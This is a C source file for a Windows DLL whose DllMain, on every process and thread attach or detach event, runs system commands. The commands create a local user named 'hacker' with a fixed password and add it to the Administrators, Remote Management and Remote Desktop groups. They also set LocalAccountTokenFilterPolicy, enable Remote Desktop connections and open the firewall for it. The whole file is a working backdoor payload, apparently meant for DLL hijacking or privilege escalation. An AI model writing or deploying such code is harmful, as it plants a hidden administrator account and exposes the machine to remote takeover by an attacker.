#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
  	    i = system ("net user hacker Password1!abc /add");
	    i = system ("net localgroup administrators hacker /add");
	    i = system ("net localgroup \"remote management users\" hacker /add");
	    i = system ("net localgroup \"remote desktop users\" hacker /add");
	    i = system ("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
	    i = system ("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
	    i = system ("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
  	    i = system ("net user hacker Password1!abc /add");
	    i = system ("net localgroup administrators hacker /add");
	    i = system ("net localgroup \"remote management users\" hacker /add");
	    i = system ("net localgroup \"remote desktop users\" hacker /add");
	    i = system ("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
	    i = system ("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
	    i = system ("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
  	    i = system ("net user hacker Password1!abc /add");
	    i = system ("net localgroup administrators hacker /add");
	    i = system ("net localgroup \"remote management users\" hacker /add");
	    i = system ("net localgroup \"remote desktop users\" hacker /add");
	    i = system ("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
	    i = system ("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
	    i = system ("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
  	    i = system ("net user hacker Password1!abc /add");
	    i = system ("net localgroup administrators hacker /add");
	    i = system ("net localgroup \"remote management users\" hacker /add");
	    i = system ("net localgroup \"remote desktop users\" hacker /add");
	    i = system ("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
	    i = system ("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
	    i = system ("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
        break;
    }
    return TRUE;
}
